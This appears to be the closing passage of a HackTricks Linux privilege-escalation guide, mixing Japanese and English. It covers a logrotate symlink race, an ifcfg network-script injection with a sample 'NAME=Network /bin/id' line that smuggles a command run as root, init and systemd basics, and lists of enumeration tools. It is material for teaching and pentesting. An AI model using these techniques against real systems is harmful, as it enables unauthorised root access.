`logrotate` に存在する脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが権限昇格できる可能性があります。これは `logrotate` が多くの場合 **root** として実行されており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。権限は _/var/log_ だけでなくログローテーションが適用されるすべてのディレクトリで確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** に非常によく似ているため、ログを変更できることが判明した場合は、誰がそれらのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（注: Network と /bin/id_ の間に空白があります）

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれており、これらは直接実行するか `/etc/rc?.d/` にあるシンボリックリンクを介して実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使用されます。

一方、`/etc/init` は Ubuntu によって導入された新しい **service management** である **Upstart** に関連し、サービス管理タスクのための設定ファイルを使用します。Upstart への移行にもかかわらず、互換レイヤーのために SysVinit スクリプトは Upstart 設定と併用され続けています。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` に整理され、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に privileged kernel functionality をユーザースペースの manager に公開するために syscall をフックします。弱い manager 認証（例：FD-order に基づく signature チェックや脆弱なパスワード方式）は、ローカルアプリが manager を偽装して既に root 化されたデバイス上で root に昇格することを可能にする場合があります。詳細および悪用の手順はこちら：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** カーネルの脆弱性を列挙するツール（Linux と macOS 向け） [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
